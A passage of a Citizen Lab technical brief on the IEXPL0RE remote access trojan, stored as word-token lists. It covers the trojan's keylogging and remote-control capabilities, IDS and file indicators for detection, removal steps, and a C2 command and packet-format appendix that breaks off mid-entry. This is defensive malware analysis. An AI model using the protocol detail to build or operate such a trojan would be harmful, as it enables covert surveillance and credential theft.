["back", "commands", "as", "desired", ".", "The", "program", "maintains", "the", "two", "sockets", ",", "sending", "heartbeat/command"], ["request", "packets", "at", "a", "specified", "interval", ",", "while", "sending", "back", "empty", "keylogger", "packets", "to", "trick", "the"], ["server", "into", "thinking", "the", "system", "is", "idle", "(figure", "9)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["FIGURE", "9:", "AN", "EXAMPLE", "OF", "THE", "FAKE", "MALWARE", "CLIENT", "COMMUNICATING", "WITH", "THE", "C2", "SERVER", "."], ["11"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["12"], ["CAPABILITIES"], ["The", "IEXPL0RE", "RAT", "contains", "over", "40", "commands", "that", "an", "attacker", "can", "use", "to", "manipulate", "the"], ["file", "system", "and", "registry", ",", "download", "and", "run", "additional", "programs", ",", "and", "find", "and", "exfiltrate", "data", "."], ["An", "infected", "computer", "defaults", "to", "recording", "keystrokes", "and", "sending", "this", "data", "back", "to", "the", "server"], ["at", "regular", "intervals", ".", "The", "additional", "commands", "are", "there", "for", "interactive", "control", "of", "the", "system", "in"], ["real-time", "by", "an", "attacker", "."], ["This", "program", "is", "likely", "used", "in", "multiple", "phases", ".", "After", "infection", ",", "the", "keylogger", "records", "data", "including", "email", "addresses", "and", "passwords", ".", "Once", "an", "account\u2019s", "credentials", "have", "been", "captured", ",", "the"], ["attacker", "can", "log", "in", "and", "set", "up", "a", "forwarding", "address", "or", "download", "all", "of", "the", "data", "stored", "online", "."], ["Once", "a", "compromised", "machine", "has", "been", "determined", "useful", "by", "looking", "at", "the", "keylogger", "data", ",", "an"], ["attacker", "can", "use", "the", "RAT", "functionality", "to", "download", "files", "and", "install", "more", "specific", "malware", "-", "for"], ["example", ",", "a", "Skype", "plugin", "that", "records", "calls", "."], ["While", "post-infection", "behaviour", "from", "an", "attacker", "against", "a", "real", "target", "has", "not", "been", "observed", "in"], ["this", "investigation", ",", "this", "is", "a", "standard", "method", "in", "targeted", "attacks", "."], ["One", "particular", "area", "of", "interest", "with", "this", "RAT", "is", "that", "it", "contains", "a", "specific", "functionality", "for", "plugins", "relating", "to", "video", "and", "audio", "capture", ".", "Each", "time", "the", "malware", "connects", "to", "the", "command", "and"], ["control", "server", ",", "it", "sends", "a", "list", "of", "all", "video", "capture", "devices", "present", "on", "the", "computer", ".", "This", "behaviour", "may", "indicate", "that", "the", "attacker", "is", "specifically", "interested", "in", "seeing", "who", "is", "on", "the", "other", "end", "of"], ["the", "computer", ",", "and", "is", "actively", "collecting", "data", "on", "what", "the", "targets", "look", "like", "."], ["For", "a", "full", "list", "of", "the", "commands", "supported", "by", "IEXPL0RE", "and", "a", "description", "of", "what", "they", "do", ",", "see"], ["Appendix", "B:", "Command", "Enumeration", "."], ["DETECTION", "AND", "MITIGATION"], ["A", "system", "infected", "with", "the", "IEXPL0RE", "RAT", "can", "be", "found", "by", "looking", "for", "presence", "of", "the", "IEXPL0RE", "files", ",", "or", "by", "watching", "network", "traffic", "."], ["In", "addition", "to", "the", "IEXPL0RE", ".", "EXE", "file", "itself", ",", "presence", "of", "the", "perf*", ".", "dat", "files", "and", "link", "files", "in"], ["%temp%", "are", "an", "indicator", "that", "the", "system", "is", "infected", ".", "The", "timestamps", "on", "the", "files", "are", "an", "indication", "of", "how", "long", "the", "system", "has", "been", "infected", "."], ["A", "network", "intrusion", "detection", "system", "(IDS)", "can", "identify", "infected", "machines", "by", "looking", "for", "wellknown", "traffic", "patterns", ".", "The", "simplest", "of", "these", "is", "checking", "for", "HTTP", "traffic", "to", "/index[0-9]{9}", ".", "asp."], ["Blocking", "this", "traffic", "will", "prevent", "the", "infected", "machine", "from", "communicating", "with", "the", "C2", "server", ","], ["receiving", "new", "commands", ",", "and", "sending", "back", "keylogger", "data", "."], ["The", "C2", "IP", "or", "hostname", "can", "also", "be", "blocked", "directly", "once", "it\u2019s", "found", ",", "at", "the", "network", "level", "or", "(as", "a"], ["temporary", "measure)", "in", "the", "infected", "computer\u2019s", "hosts", "file", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["13"], ["REMOVAL"], ["A", "running", "copy", "of", "IEXPL0RE", "can", "be", "stopped", "by", "killing", "the", "appropriate", "svchost", "process", ".", "This"], ["process", "is", "identifiable", "as", "it", "is", "not", "in", "the", "correct", "place", "in", "the", "process", "tree", ".", "In", "figure", "10", ",", "this", "is", "the"], ["last", "process", "in", "the", "list", ",", "PID", "1256:"], ["FIGURE", "10:", "PROCESS", "EXPLORER", "SHOWING", "THE", "INFECTED", "SVCHOST", ".", "EXE", "PROCESS", "(1256)", "."], ["The", "process", "can", "be", "killed", "with", "the", "Process", "Explorer", "tool", ",", "part", "of", "the", "Sysinternals", "package"], ["(figure", "10)", "."], ["Once", "the", "process", "has", "been", "terminated", ",", "removal", "is", "as", "simple", "as", "deleting", "the", "installed", "files", "(see"], ["the", "section", "on", "Infection", "above", "for", "a", "list)", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["14"], ["CONCLUSIONS"], ["The", "IEXPL0RE", "RAT", "is", "a", "good", "example", "of", "the", "current", "state", "of", "APT", "attacks", ",", "especially", "those", "targeting", "human", "rights", "organizations", "and", "NGOs", ".", "While", "they", "are", "not", "particularly", "advanced", "from", "a"], ["technical", "standpoint", ",", "they", "are", "custom", "designed", "to", "appeal", "to", "and", "pique", "the", "interest", "of", "the", "recipient", "."], ["The", "attacker", "uses", "social", "engineering", "to", "get", "a", "foot", "in", "the", "door", "of", "an", "organization", ".", "All", "it", "takes", "is"], ["for", "one", "user", "to", "run", "a", "malicious", "program", "that", "looks", "like", "a", "legitimate", "video", ",", "spreadsheet", ",", "or", "other"], ["document", ".", "Once", "running", "on", "a", "user\u2019s", "machine", ",", "the", "program", "will", "silently", "record", "passwords", "and"], ["provide", "the", "attacker", "a", "way", "of", "accessing", "sensitive", "data", "."], ["This", "report", "describes", "what", "is", "\u201cnormal\u201d", "in", "this", "area", ",", "by", "detailing", "what", "a", "common", "attack", "looks", "like"], ["at", "each", "step", "of", "the", "way", ",", "from", "when", "an", "email", "is", "first", "received", "to", "when", "data", "leaves", "the", "network", "."], ["Many", "APT", "campaigns", "like", "the", "one", "presented", "in", "this", "report", "exist", "and", "continue", "to", "steal", "data", "every"], ["day", ",", "but", "are", "both", "avoidable", "and", "correctable", "."], ["The", "IEXPL0RE", "RAT", "is", "under", "active", "development", ",", "as", "both", "the", "client", "and", "server", "components", "are"], ["continuously", "changing", ".", "The", "server", "in", "particular", "has", "exhibited", "different", "behavior", "over", "time", ",", "mostly"], ["related", "to", "blocking", "unauthorized", "access", "from", "the", "outside", "world", ".", "For", "example", ",", "the", "redirect", "to", "Microsoft\u2019s", "website", "when", "referencing", "an", "invalid", "URL", "was", "not", "present", "when", "this", "investigation", "began", ".", "The"], ["presence", "of", "development", "work", "or", "upgrades", "implies", "that", "this", "system", "is", "actively", "used", "and", "monitored", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["APPENDIX", "A:", "CONFIGURATION", "FILE"], ["The", "configuration", "sent", "to", "the", "C2", "server", "on", "initial", "connection", "has", "the", "client", "configuration", "at", "the"], ["beginning", "(figure", "11)", ",", "followed", "by", "more", "information", "about", "the", "infected", "computer", "(figure", "12)", "."], ["FIGURE", "11:", "CLIENT", "CONFIGURATION", "SENT", "TO", "C2"], ["15"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["FIGURE", "12:"], ["DETAILED", "INFORMATION", "ON", "INFECTED", "COMPUTER", "SENT", "TO", "C2"], ["16"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["17"], ["APPENDIX", "B:", "COMMAND", "ENUMERATION"], ["The", "following", "is", "a", "list", "of", "all", "commands", "present", "in", "the", "IEXPL0RE", "malware", ",", "and", "a", "detailed"], ["description", "of", "what", "data", "is", "received", "or", "sent", "over", "the", "network", "for", "each", "command", "."], ["CODE"], ["COMMAND"], ["SERVER", "/"], ["DESCRIPTION"], ["CLIENT"], ["0x00"], ["Failure"], ["C"], ["Client", "response", "for", "a", "variety", "of", "commands", "to", "indicate", "that", "the", "operation", "did"], ["not", "succeed", "."], ["0x01"], ["Success"], ["C"], ["Client", "response", "for", "a", "variety", "of", "commands", "to", "indicate", "that", "the", "operation", "succeeded", ".", "Contains", "variable", "data", "related", "to", "the", "command", "request", "."], ["0x01"], ["Reply", "file", "does", "not", "exist"], ["C"], ["Reply", "file", "for", "plugin", "does", "not", "exist", "."], ["Packet", "contains:"], ["[4]", "-", "Command", "code", "(0x01)"], ["0x02"], ["Reply", "file", "over", "512kB"], ["C"], ["Reply", "file", "for", "plugin", "is", "over", "512kB", "."], ["Packet", "contains:"], ["[4]", "-", "Command", "code", "(0x02)"], ["0x03"], ["Reply", "file"], ["C"], ["Reply", "file", "for", "plugin", "."], ["Packet", "contains:"], ["[var]", "-", "buffer", "--", "implemented", "so", "always", "0", "?"], ["0x03"], ["Shutdown"], ["S"], ["Sends", "a", "shutdown", "+", "power", "off", "+", "force", "command", "to", "the", "system", ".", "Requires"], ["parameters", "0/0", "."], ["0x04"], ["Reboot"], ["S"], ["Sends", "a", "reboot", "+", "force", "command", "to", "the", "system", ".", "Requires", "parameters", "0/0", "."], ["0x06"], ["Reconnect"], ["S"], ["Disconnects", "open", "connections", "and", "reconnects", "."], ["0x07"], ["Shut", "off", "display"], ["S"], ["Sends", "WM_SYSCOMMAND", "message", "SC_MONITORPOWER", "to", "shut", "off", "the"], ["display", "."], ["0x0B"], ["Download", "and", "install"], ["malware"], ["S"], ["Downloads", "a", "file", ",", "writes", "it", "to", "disk", ",", "and", "possibly", "executes", "it", "."], ["Packet", "contains:"], ["[4]", "-", "executable", "size"], ["[var]", "-", "executable"], ["Depending", "on", "configuration", "and", "AV", "software", "present", ",", "writes", "the", "file", "to", "IEXPL0RE", ".", "EXE", "(in", "application", "data", "folder", ",", "Microsoft", "subfolder)", ",", "fxsst", ".", "dll", "(in", "Windows", "system", "directory)", ",", "or", "SENS64", ".", "DLL", "(in", "temp", "path)", ".", "May", "run", "IEXPL0RE", "."], ["EXE", "depending", "on", "options;", "may", "also", "install", "configuration", "file", "(STREAM", ".", "SYS"], ["or", "Cache)", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["0x0C"], ["Install", "dropped", "files"], ["S"], ["Checks", "configuration", "file", "options", "and", "moves", "the", "appropriate", "dropped", "files", "to"], ["the", "correct", "locations", "(may", "vary", "depending", "on", "Windows", "version)", "."], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x0D"], ["Update", "configuration"], ["file"], ["S"], ["18"], ["Downloads", "new", "configuration", "parameters", "and", "writes", "the", "updated", "information"], ["to", "the", "configuration", "file", "."], ["Packet", "option", "2:"], ["[2]", "-", "Value1", "==", "2"], ["[180]", "-", "Unused", "?"], ["Packet", "option", "1:", "update", "campaign", "name", "?"], ["[2]", "-", "Value1", "==", "1"], ["[4]", "-", "campaign", "name", "length"], ["[var]", "-", "campaign", "name"], ["Packet", "option", "4:", "update", "configuration", "file"], ["[2]", "-", "Value1", "==", "4"], ["[2]", "-", "port"], ["[2]", "-", "unknown", "(offset", "264)"], ["[2]", "-", "unknown", "(offset", "266)"], ["[4]", "-", "unknown", "(offset", "664)"], ["[1]", "-", "unknown", "(offset", "274)"], ["[1]", "-", "unknown", "(offset", "534)"], ["[2]", "-", "unknown", "(offset", "532)"], ["[2]", "-", "unknown", "(offset", "270)"], ["[2]", "-", "unknown", "(offset", "272)"], ["[4]", "-", "campaign", "name", "length"], ["[var]", "-", "campaign", "name"], ["[4]", "-", "C2", "name", "length"], ["[var]", "-", "C2", "name"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(unused", "?", ")"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(offset", "275)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(offset", "535)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(offset", "599)"], ["Returns", "failure", "or", "success", "with", "parameters", "0/0", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x0E"], ["Download", "and", "run"], ["plugin"], ["S"], ["19"], ["Opens", "a", "new", "connection", "in", "a", "new", "thread", ",", "downloads", "a", "file", ",", "then", "runs", "it", "(possibly"], ["with", "Internet", "Explorer", "credentials)", ".", "This", "looks", "like", "a", "plugin", "activation", "for", "screen"], ["captures", "and", "audio", "recording", "--", "references", "offscreen", ".", "dll", "and", "offsound", ".", "dll."], ["Packet", "contains:"], ["[4]", "-", "unknown", "(field_4)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_8)"], ["[4]", "-", "DLL", "name", "length"], ["[var]", "-", "DLL", "name"], ["[4]", "-", "DLL", "arguments", "length"], ["[var]", "-", "DLL", "arguments"], ["[4]", "-", "Reply", "filename", "length"], ["[var]", "-", "Reply", "filename"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_620)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_724)"], ["[1]", "-", "unknown", "(field_828)"], ["[1]", "-", "unknown", "(field_829)"], ["[1]", "-", "unknown", "(field_82A)"], ["[1]", "-", "Add", "process", "ID", ",", "socket", ",", "verb", "to", "DLL", "arguments", "?"], ["[1]", "-", "Create", "process", "as", "IE", "user", "?"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_82C)"], ["[4]", "-", "unknown", "(field_934)"], ["Handshake", "for", "the", "new", "connection", "uses", "connection", "number", "-1", "."], ["If", "the", "connection", "is", "successful", ",", "replies", "with", "a", "failure", "packet", ",", "parameters", "0/0", ","], ["containing:"], ["[4]", "-", "unknown", "(field_4)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_8)"], ["[4]", "-", "DLL", "name", "length"], ["[var]", "-", "DLL", "name"], ["[4]", "-", "Reply", "filename", "length"], ["[var]", "-", "Reply", "filename"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_620)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_724)"], ["[1]", "-", "unknown", "(field_828)"], ["[1]", "-", "unknown", "(field_829)"], ["[4]", "-", "unknown", "length"], ["[var]", "-", "unknown", "(field_82C)"], ["[4]", "-", "unknown", "(field_934)"], ["If", "successful", ",", "it", "will", "send", "the", "C2", "an", "X", "command", ".", "The", "C2", "will", "reply", "with", "a"], ["file", ",", "which", "the", "client", "writes", "to", "disk", ".", "The", "client", "will", "send", "a", "success", "or", "failure"], ["packet", "with", "parameters", "0/0", "depending", "on", "whether", "the", "file", "was", "received", "."], ["If", "field_828", "is", "non-zero", ",", "the", "client", "will", "send", "the", "contents", "of", "the", "reply", "filename", "specified", "in", "a", "0x03", "command", "with", "parameters", "0/0", ".", "The", "way", "this", "is"], ["implemented", ",", "it", "appears", "as", "if", "it", "will", "always", "send", "an", "empty", "packet", "."], ["If", "process", "creation", "is", "unsuccessful", ",", "it", "will", "send", "a", "failure", "packet", "with", "parameters", "0/0", "containing", "the", "following:"], ["[4]", "-", "command", "(0x00)"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x0F"], ["Download", "and", "execute"], ["file"], ["S"], ["Downloads", "a", "file", "and", "runs", "it", "."], ["Packet", "contains:"], ["[4]", "-", "executable", "size"], ["[var]", "-", "executable"], ["Downloads", "the", "file", "to", "%temp%", "and", "executes", "it", ".", "Returns", "failure", "or", "success"], ["with", "parameters", "0/0", "."], ["0x10"], ["Unknown"], ["S"], ["Updates", "a", "values", "in", "the", "lock", ".", "dat", "file", "and", "sets", "an", "event", "."], ["Packet", "contains:"], ["[4]", "-", "Value", "length"], ["[var]", "-", "Value"], ["Sets", "the", "DWORD", "at", "lock", ".", "dat", "offset", "516", "to", "2", ",", "and", "copies", "the", "value", "from", "the"], ["packet", "to", "offset", "520", ".", "Sets", "the", "USERMODECMD", "event", "."], ["0x11"], ["Unknown"], ["S"], ["Reads", "a", "value", "out", "of", "%temp%/screenlog", ".", "txt."], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "0/0", "depending", "on"], ["whether", "the", "value", "read", "equals", "1", ".", "The", "command", "contains:"], ["[4]", "-", "Value"], ["Where", "value", "equals:"], ["0", ":", "file", "does", "not", "exist"], ["3", ":", "value", "read", "from", "file", "equals", "1"], ["4", ":", "value", "read", "from", "file", "equals", "0"], ["5", ":", "value", "read", "from", "file", "equals", "2"], ["0x12"], ["Unknown"], ["S"], ["Reads", "a", "value", "out", "of", "%temp%/offsoundlog", ".", "txt."], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "0/0", "depending", "on"], ["whether", "the", "value", "read", "equals", "1", ".", "The", "command", "contains:"], ["[4]", "-", "Value"], ["Where", "value", "equals:"], ["0", ":", "file", "does", "not", "exist"], ["3", ":", "value", "read", "from", "file", "equals", "1"], ["4", ":", "value", "read", "from", "file", "equals", "0"], ["5", ":", "value", "read", "from", "file", "equals", "2"], ["0x1E"], ["sub_10004603()"], ["C"], ["If", "not", "empty", ",", "packet", "contains:"], ["[2]", "-", "_WIN32_FIND_DATAA", "structure", "length"], ["[var]", "-", "Data", "for", "file", "name"], ["If", "empty", ",", "packet", "contains:"], ["[2]", "-", "Set", "to", "0"], ["[1]", "-", "1", "if", "structure", "size", ">", "40000", ",", "0", "if", "failure"], ["Parameters", "are", "set", "to", "Res1/Res2", "."], ["20"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x20"], ["Move", "file"], ["S"], ["21"], ["Moves", "a", "file", "or", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "Source", "length"], ["[var]", "-", "Source"], ["[4]", "-", "Destination", "length"], ["[var]", "-", "Destination"], ["Returns", "failure", "or", "success", "with", "parameters", "1/Res1"], ["0x21"], ["Delete", "file"], ["S"], ["Deletes", "a", "file", "or", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "File", "name", "length"], ["[var]", "-", "File", "name"], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "Res2/Res1", "."], ["0x22"], ["Create", "directory"], ["S"], ["Creates", "a", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "Path", "name", "length"], ["[var]", "-", "Path", "name"], ["Returns", "a", "success", "or", "failure", "command", "with", "parameters", "Res2/Res1", "."], ["0x23"], ["GetSystemInfo", "request"], ["S"], ["Requests", "client", "to", "send", "a", "0x24", "response", "with", "the", "output", "of", "GetSystemInfo()", "."], ["0x24"], ["GetSystemInfo", "response"], ["C"], ["Contains", "a", "_SYSTEM_INFO", "struct", "with", "the", "output", "of", "GetSystemInfo()", "."], ["0x26"], ["Get", "document", "paths"], ["S"], ["Gets", "paths", "for", "CSIDL", "special", "folders", "PERSONAL", "(My", "Documents)", ",", "DESKTOPDIRECTORY", "(Desktop)", ",", "and", "HISTORY", "(Internet", "history)", "."], ["Returns", "a", "success", "command", "containing:"], ["[4]", "-", "My", "Documents", "path", "length"], ["[var]", "-", "My", "Documents", "path"], ["[4]", "-", "Desktop", "path", "length"], ["[var]", "-", "Desktop", "path"], ["[4]", "-", "Internet", "history", "path", "length"], ["[var]", "-", "Internet", "history", "path"], ["Parameters", "are", "set", "to", "1/Res1", "."], ["0x29"], ["Move", "file", "or", "directory"], ["S"], ["Moves", "a", "file", "or", "directory", "."], ["Packet", "contains:"], ["[4]", "-", "Source", "length"], ["[var]", "-", "Source"], ["[4]", "-", "Destination", "length"], ["[var]", "-", "Destination"], ["Returns", "failure", "or", "success", "with", "parameters", "1/Res1", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x2A"], ["Set", "file", "access", "time", "and"], ["attributes"], ["S"], ["22"], ["Sets", "the", "creation", "time", ",", "last", "access", "time", ",", "last", "write", "time", ",", "and", "file", "attributes", "of"], ["a", "file", "."], ["Packet", "contains:"], ["[8]", "-", "CreationTime"], ["[8]", "-", "LastAccessTime"], ["[8]", "-", "LastWriteTime"], ["[4]", "-", "dwFileAttributes"], ["[4]", "-", "File", "name", "length"], ["[var]", "-", "File", "name"], ["Returns", "failure", "or", "success", "with", "parameters", "Res2/Res1", "."], ["0x2B"], ["Unknown"], ["S"], ["Does", "some", "file-walking", ",", "including", "across", "all", "drives", "available", "(A", "to", "Z)", ".", "Replies"], ["with", "a", "0x2C", "command", "followed", "by", "a", "number", "of", "0x2D", "commands", "."], ["Packet", "contains:"], ["[4]", "-", "Directory", "length"], ["[var]", "-", "Directory"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown"], ["0x2C"], ["Unknown", "start", "response"], ["C"], ["Response", "to", "the", "0x2B", "command", ".", "Uses", "parameters", "Res2/Res1", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "0x2D", "packets", "to", "follow"], ["0x2D"], ["Unknown", "response"], ["C"], ["Response", "to", "the", "0x2B", "command", ".", "Uses", "parameters", "Res2/Res1", "."], ["Packet", "contains:"], ["[4]", "-", "Unknown", "data", "length"], ["[var]", "-", "Unknown", "data", ",", "result", "of", "sub_10001B73()"], ["0x2F"], ["Owner", "name", ",", "organization", ",", "and", "serial", "number"], ["request"], ["S"], ["0x46"], ["Read", "from", "file"], ["S"], ["0x47"], ["Read", "from", "file", "response"], ["C"], ["Sends", "the", "owner", "name", ",", "organization", ",", "and", "serial", "number", "."], ["Returns", "a", "success", "response", "with", "the", "following", "data:"], ["[4]", "-", "Username", "length"], ["[var]", "-", "Username"], ["[4]", "-", "User", "organization", "length"], ["[var]", "-", "User", "organization"], ["[4]", "-", "Serial", "length"], ["[var]", "-", "Serial"], ["Packet", "contains:"], ["[8]", "-", "File", "offset"], ["[2]", "-", "Characters", "to", "read"], ["[4]", "-", "Length", "of", "field", "3"], ["[var]", "-", "Field", "3"], ["Replies", "with", "a", "0x47", "packet", "containing", "data", "from", "a", "file", "."], ["Response", "to", "0x46", "that", "contains", "data", "from", "a", "file", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "contains:"], ["[2]", "-", "Size"], ["[var]", "-", "Data"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x4B"], ["List", "files"], ["S"], ["Lists", "files", "in", "a", "given", "directory", "along", "with", "file", "size", "and", "last", "write", "times", "."], ["Packet", "contains"], ["[4]", "-", "Directory", "length"], ["[var]", "-", "Directory"], ["0x4C"], ["Start", "of", "list", "files"], ["response"], ["C"], ["Start", "of", "list", "response", "to", "0x4B", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "has", "no", "payload", "."], ["0x4D"], ["End", "of", "list", "files"], ["response"], ["C"], ["End", "of", "list", "response", "to", "0x4B", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "has", "no", "payload", "."], ["0x4E"], ["List", "files", "response"], ["C"], ["List", "item", "for", "response", "to", "0x4B", ".", "Sent", "with", "parameters", "2/2", "."], ["Packet", "contains:"], ["[8]", "-", "FindFileData", ".", "nFileSizeLow,", "FindFileData", ".", "nFileSizeHigh"], ["[8]", "-", "", ".", "ftLastWriteTime.dwLowDateTime,", "", ".", "dwHighDateTime"], ["[4]", "-", "length", "of", "next", "field"], ["[var]", "-", "whole", "string:", "filename", "plus", "size", "and", "write", "time"], ["0x4F"], ["Open", "file"], ["S"], ["Opens", "a", "specified", "file", "for", "use", "with", "0x46", "[and", "friends]", "."], ["23"], ["Packet", "contains:"], ["[4]", "-", "File", "name", "length"], ["[var]", "-", "File", "name"], ["[4]", "-", "File", "mode", "length"], ["[var]", "-", "File", "mode"], ["Returns", "failure", "or", "success", "with", "parameters", "2/2", "."], ["0x50"], ["Close", "file"], ["S"], ["Closes", "file", "opened", "with", "0x4F", "command", ".", "No", "response", "sent", "."], ["0x5A"], ["Start", "of", "running", "program", "list"], ["C"], ["Response", "to", "0x5D", "command", "that", "signals", "the", "start", "of", "a", "list", "of", "running", "programs", "."], ["Packet", "is", "empty", "with", "parameters", "3/Res1", "."], ["0x5B"], ["End", "of", "running", "program", "list"], ["C"], ["0x5C"], ["Running", "program"], ["C"], ["Response", "to", "0x5D", "command", "that", "signals", "the", "end", "of", "a", "list", "of", "running", "programs", "."], ["Packet", "is", "empty", "with", "parameters", "3/Res1", "."], ["Response", "to", "0x5D", "command", "that", "contains", "the", "first", "executable", "module", "for", "a"], ["single", "process", ".", "One", "packet", "is", "sent", "per", "process", "."], ["Packet", "contains:"], ["[24]", "-", "PROCESSENTRY32", ".", "th32ProcessID"], ["[4]", "-", "length", "of", "executable", "module", "name"], ["[var]", "-", "length", "of", "executable", "module"], ["0x5D"], ["List", "running", "programs"], ["S"], ["Sends", "a", "list", "of", "executable", "names", "for", "running", "processes", ".", "Replies", "with", "a", "0x5A"], ["response", ",", "followed", "with", "a", "0x5C", "packet", "for", "each", "executable", ",", "and", "ends", "with", "a"], ["0x5B", "response", "."], ["Client", "uses", "the", "CreateToolhelp32Snapshot()", "API", "function", "followed", "by", "Process32First()/Process32Next()", "to", "list", "all", "processes", ".", "The", "executable", "name", "is"], ["the", "module", "name", "returned", "by", "Module32First()", "."], ["0x5E"], ["Kill", "process"], ["S"], ["Kills", "a", "running", "process", "."], ["Packet", "contains:"], ["[4]", "-", "Process", "ID"], ["Returns", "failure", "or", "success", "with", "parameters", "3/Res1", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x5F"], ["Run", "program"], ["S"], ["24"], ["Runs", "a", "program", "already", "present", "on", "the", "client", "."], ["Packet", "contains:"], ["[4]", "-", "Command", "line", "length"], ["[var]", "-", "Command", "line"], ["Returns", "success", "or", "failure", "with", "parameters", "3/Res1", "."], ["0x72"], ["Unknown", "-", "open", "connection", "B", "?"], ["S"], ["Creates", "multiple", "new", "threads", "and", "a", "new", "C2", "connection", "(via", "full", "handshake)"], ["with", "connection", "number", "11", "."], ["Packet", "contains:"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown", "value", "(if", "0", "<", "length", "<", "80000)"], ["Returns", "success", "or", "failure", "with", "parameters", "11/11", ".", "If", "successful", ",", "contains"], ["the", "following", "payload:"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown", "(v2", "+", "808)"], ["[4]", "-", "Unknown", "value"], ["0x73"], ["Unknown", "-", "remove", "connection", "B", "?"], ["S"], ["May", "relate", "to", "uninstalling", "."], ["Packet", "contains:"], ["[4]", "-", "Process", "ID"], ["Kills", "the", "process", "with", "given", "process", "ID", ",", "and", "closes", "a", "socket", ".", "Returns", "success"], ["or", "failure", "with", "parameters", "11/11", ".", "If", "failure", ",", "contains", "the", "following", "payload:"], ["[4]", "-", "Process", "ID"], ["[4]", "-", "Unknown", "length"], ["[var]", "-", "Unknown", "(v2", "+", "808)"], ["0x82"], ["Number", "of", "services"], ["C"], ["Response", "to", "0x85", "command", "with", "the", "number", "of", "services", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Number", "of", "services", "returned", "by", "EnumServicesStatusA()"], ["Response", "parameters", "are", "5/5", "."], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x84"], ["Service", "information"], ["C"], ["25"], ["Response", "to", "0x85", "command", "with", "details", "on", "a", "service", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "handle"], ["[4]", "-", "Current", "state"], ["[4]", "-", "Start", "type"], ["[4]", "-", "Error", "control"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Length", "of", "service", "display", "name"], ["[var]", "-", "Service", "display", "name"], ["[4]", "-", "Length", "of", "service", "binary", "path"], ["[var]", "-", "Service", "binary", "path"], ["[4]", "-", "Length", "of", "service", "description"], ["[var]", "-", "Service", "description"], ["[4]", "-", "Length", "of", "service", "start", "name"], ["[var]", "-", "Service", "start", "name"], ["Response", "parameters", "are", "5/5", "."], ["0x85"], ["List", "services"], ["S"], ["Lists", "all", "services", "on", "the", "system", ".", "Sends", "a", "0x82", "response", "with", "the", "number", "of"], ["services", ",", "then", "0x84", "responses", "with", "service", "details", "."], ["0x86"], ["Start", "service"], ["S"], ["Starts", "a", "service", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["Returns", "success", "with", "parameters", "5/5", "if", "service", "is", "started", "."], ["0x87"], ["Control", "service"], ["S"], ["Sends", "a", "control", "message", "to", "a", "service", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Length", "of", "service", "name"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Service", "control", "parameter"], ["Service", "control", "parameters", "are:"], ["1", "-", "stop"], ["2", "-", "pause"], ["3", "-", "continue"], ["Returns", "success", "with", "parameters", "5/5", "with", "the", "payload:"], ["[4]", "-", "Service", "current", "state"], ["CITIZEN", "LAB", "TECHNICAL", "BRIEF:", "IEXPL0RE", "RAT"], ["0x88"], ["Create", "service"], ["S"], ["26"], ["Creates", "a", "new", "service", "on", "the", "system", "."], ["Packet", "contains:"], ["[4]", "-", "Service", "name", "length"], ["[var]", "-", "Service", "name"], ["[4]", "-", "Display", "name", "length"], ["[var]", "-", "Display", "name", "(set", "in", "CreateServiceA())"], ["[4]", 